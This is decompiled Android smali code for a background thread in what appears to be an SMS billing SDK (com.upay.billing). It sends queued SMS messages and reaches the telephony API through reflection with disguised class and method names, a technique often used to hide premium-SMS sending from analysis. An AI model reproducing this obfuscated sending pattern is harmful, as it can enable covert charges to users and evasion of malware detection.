.class final Lcom/upay/billing/engine/MessageRunner$2;
.super Ljava/lang/Thread;


# direct methods
.method constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 12

    const/4 v8, 0x1

    const/4 v9, 0x0

    :goto_0
    const-wide/16 v0, 0x1f4

    :try_start_0
    invoke-static {v0, v1}, Lcom/upay/billing/engine/MessageRunner$2;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1

    :goto_1
    new-instance v10, Ljava/util/ArrayList;

    invoke-direct {v10}, Ljava/util/ArrayList;-><init>()V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    invoke-static {}, Lcom/upay/billing/engine/MessageRunner;->access$000()Ljava/util/LinkedHashMap;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/LinkedHashMap;->values()Ljava/util/Collection;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Collection;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_0
    :goto_2
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/upay/billing/engine/MessageRunner;

    invoke-static {v0}, Lcom/upay/billing/engine/MessageRunner;->access$500(Lcom/upay/billing/engine/MessageRunner;)J

    move-result-wide v4

    sub-long v4, v1, v4

    long-to-int v4, v4

    invoke-static {v0}, Lcom/upay/billing/engine/MessageRunner;->access$600(Lcom/upay/billing/engine/MessageRunner;)Z

    move-result v5

    if-eqz v5, :cond_0

    invoke-static {v0}, Lcom/upay/billing/engine/MessageRunner;->access$700(Lcom/upay/billing/engine/MessageRunner;)I

    move-result v5

    if-le v4, v5, :cond_0

    invoke-static {v0}, Lcom/upay/billing/engine/MessageRunner;->access$100(Lcom/upay/billing/engine/MessageRunner;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v0}, Lcom/upay/billing/engine/MessageRunner;->access$200(Lcom/upay/billing/engine/MessageRunner;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v4, v5, v8}, Lcom/upay/billing/engine/MessageRunner;->onSuccess(Ljava/lang/String;Ljava/lang/String;I)V

    invoke-static {v0}, Lcom/upay/billing/engine/MessageRunner;->access$800(Lcom/upay/billing/engine/MessageRunner;)I

    move-result v0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v10, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_2

    :cond_1
    invoke-static {}, Lcom/upay/billing/engine/MessageRunner;->access$000()Ljava/util/LinkedHashMap;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/LinkedHashMap;->values()Ljava/util/Collection;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Collection;->iterator()Ljava/util/Iterator;

    move-result-object v11

    :cond_2
    :goto_3
    invoke-interface {v11}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_3

    invoke-interface {v11}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    move-object v7, v0

    check-cast v7, Lcom/upay/billing/engine/MessageRunner;

    invoke-static {v7}, Lcom/upay/billing/engine/MessageRunner;->access$600(Lcom/upay/billing/engine/MessageRunner;)Z

    move-result v0

    if-nez v0, :cond_2

    new-instance v0, Landroid/content/Intent;

    const-string v1, "com.upay.billing.util.SmsSentAction"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v1, "upay.message.id"

    invoke-static {v7}, Lcom/upay/billing/engine/MessageRunner;->access$800(Lcom/upay/billing/engine/MessageRunner;)I

    move-result v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    invoke-static {v7}, Lcom/upay/billing/engine/MessageRunner;->access$900(Lcom/upay/billing/engine/MessageRunner;)Landroid/content/Context;

    move-result-object v1

    invoke-static {v7}, Lcom/upay/billing/engine/MessageRunner;->access$800(Lcom/upay/billing/engine/MessageRunner;)I

    move-result v2

    invoke-static {v1, v2, v0, v9}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v5

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    invoke-static {v7, v0, v1}, Lcom/upay/billing/engine/MessageRunner;->access$502(Lcom/upay/billing/engine/MessageRunner;J)J

    invoke-static {v7, v8}, Lcom/upay/billing/engine/MessageRunner;->access$602(Lcom/upay/billing/engine/MessageRunner;Z)Z

    :try_start_1
    invoke-static {v7}, Lcom/upay/billing/engine/MessageRunner;->access$1000(Lcom/upay/billing/engine/MessageRunner;)I

    move-result v0

    if-nez v0, :cond_4

    const-string v0, "5ndroid.64l4phony.S3215n5g4r"

    invoke-static {v0}, Lcom/upay/billing/engine/MessageRunner;->access$1100(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    const-string v1, "g46D4f5ul6"

    invoke-static {v1}, Lcom/upay/billing/engine/MessageRunner;->access$1100(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/Class;

    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    const/4 v2, 0x0

    const/4 v3, 0x0

    new-array v3, v3, [Ljava/lang/Object;

    invoke-virtual {v1, v2, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    const-string v2, "24ndT4x614225g4"

    invoke-static {v2}, Lcom/upay/billing/engine/MessageRunner;->access$1100(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x5

    new-array v3, v3, [Ljava/lang/Class;

    const/4 v4, 0x0

    const-class v6, Ljava/lang/String;

    aput-object v6, v3, v4

    const/4 v4, 0x1

    const-class v6, Ljava/lang/String;

    aput-object v6, v3, v4

    const/4 v4, 0x2

    const-class v6, Ljava/lang/String;

    aput-object v6, v3, v4

    const/4 v4, 0x3

    const-class v6, Landroid/app/PendingIntent;

    aput-object v6, v3, v4

    const/4 v4, 0x4

    const-class v6, Landroid/app/PendingIntent;

    aput-object v6, v3, v4

    invoke-virtual {v0, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v2, 0x5

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    invoke-static {v7}, Lcom/upay/billing/engine/MessageRunner;->access$1200(Lcom/upay/billing/engine/MessageRunner;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const/4 v4, 0x0

    aput-object v4, v2, v3

    const/4 v3, 0x2

    invoke-static {v7}, Lcom/upay/billing/engine/MessageRunner;->access$100(Lcom/upay/billing/engine/MessageRunner;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x3

    aput-object v5, v2, v3

    const/4 v3, 0x4

    const/4 v4, 0x0

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    :cond_3
    :goto_4
    invoke-static {}, Lcom/upay/billing/engine/MessageRunner;->access$000()Ljava/util/LinkedHashMap;

    move-result-object v1

    monitor-enter v1

    :try_start_2
    invoke-virtual {v10}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :goto_5
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_7

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Integer;

    invoke-static {}, Lcom/upay/billing/engine/MessageRunner;->access$000()Ljava/util/LinkedHashMap;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/util/LinkedHashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    goto :goto_5

    :catchall_0
    move-exception v0

    monitor-exit v1
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    throw v0

    :cond_4
    :try_start_3
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    const/16 v3, 0x3e8

    invoke-static {v7}, Lcom/upay/billing/engine/MessageRunner;->access$1200(Lcom/upay/billing/engine/MessageRunner;)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    invoke-static {v7}, Lcom/upay/billing/engine/MessageRunner;->access$100(Lcom/upay/billing/engine/MessageRunner;)Ljava/lang/String;

    move-result-object v4

    const/4 v6, 0x0

    invoke-static {v4, v6}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v4

    const/4 v6, 0x0

    invoke-virtual/range {v0 .. v6}, Landroid/telephony/SmsManager;->sendDataMessage(Ljava/lang/String;Ljava/lang/String;S[BLandroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_4

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    invoke-static {v7}, Lcom/upay/billing/engine/MessageRunner;->access$310(Lcom/upay/billing/engine/MessageRunner;)I

    move-result v1

    if-lez v1, :cond_6

    move v1, v8

    :goto_6
    instance-of v2, v0, Ljava/lang/reflect/InvocationTargetException;

    if-eqz v2, :cond_5

    check-cast v0, Ljava/lang/reflect/InvocationTargetException;

    invoke-virtual {v0}, Ljava/lang/reflect/InvocationTargetException;->getTargetException()Ljava/lang/Throwable;

    move-result-object v0

    :cond_5
    invoke-static {v7}, Lcom/upay/billing/engine/MessageRunner;->access$400(Lcom/upay/billing/engine/MessageRunner;)Ljava/lang/StringBuffer;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "ex="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v0}, Ljava/lang/Throwable;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, "---"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    if-nez v1, :cond_2

    const/16 v0, 0x78

    invoke-static {v7}, Lcom/upay/billing/engine/MessageRunner;->access$400(Lcom/upay/billing/engine/MessageRunner;)Ljava/lang/StringBuffer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v7, v0, v1}, Lcom/upay/billing/engine/MessageRunner;->onFailed(ILjava/lang/String;)V

    invoke-static {v7}, Lcom/upay/billing/engine/MessageRunner;->access$800(Lcom/upay/billing/engine/MessageRunner;)I

    move-result v0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v10, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto/16 :goto_3

    :cond_6
    move v1, v9

    goto :goto_6

    :cond_7
    :try_start_4
    monitor-exit v1
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    goto/16 :goto_0

    :catch_1
    move-exception v0

    goto/16 :goto_1
.end method
